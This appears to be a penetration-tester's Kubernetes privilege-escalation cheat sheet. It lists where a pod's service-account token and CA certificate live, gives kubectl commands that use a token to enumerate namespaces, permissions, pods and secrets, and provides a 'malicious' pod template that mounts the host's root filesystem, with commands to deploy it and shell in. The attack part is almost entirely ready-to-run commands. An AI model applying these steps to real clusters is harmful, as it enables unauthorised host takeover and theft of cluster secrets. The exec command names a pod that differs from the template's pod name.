---
title: "Kubernetes"
date: 2024-7-22
tags: ["Kubernetes", "container", "privesc"]
---

### Token Location

<div>

```console
/run/secrets/kubernetes.io/serviceaccount/token
```

</div>

### Certificate Location

<div>

```console
/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

</div>

### Basic Commands

<div>

```console
# List all namespaces
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get namespaces
```

```console
# Get user permissions in current namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list
```

```console
# Get user permissions in specific namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list -n <NAMESPACE>
```

```console
# List all pods
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods --all-namespaces
```

```console
# List pods in specific namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods -n <NAMESPACE>
```

```console
# Get YAML of a pod
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pod <POD_NAME> -o yaml
```

```console
# Get info of a pod
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describe pod <POD_NAME> -n <NAMESPACE>
```

```console
# List secrets
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get secrets -n <NAMESPACE>
```

```console
# Get info of a secret
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> describe secret <SECRET_NAME> -n <NAMESPACE>
```

</div>

<small>*Ref: [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)*</small>

<br>

---

### Abuse #1: Mount host's file system

#### 1. Create a Malicious YAML (Template)

<div>

```console
apiVersion: v1 
kind: Pod
metadata:
  name: alpine
  namespace: <NAMESPACE_NAME>
spec:
  containers:
  - name: test
    image: <IMAGE_NAME>
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

</div>

#### 2. Create a new pod

<div>

```console
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> apply -f test.yaml
```

</div>

#### 3. Execute

<div>

```console
kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> exec test --stdin --tty -n <NAMESPACE>
```

```console
# Check host filesystem
cd /mnt/root/
```

</div>

<br>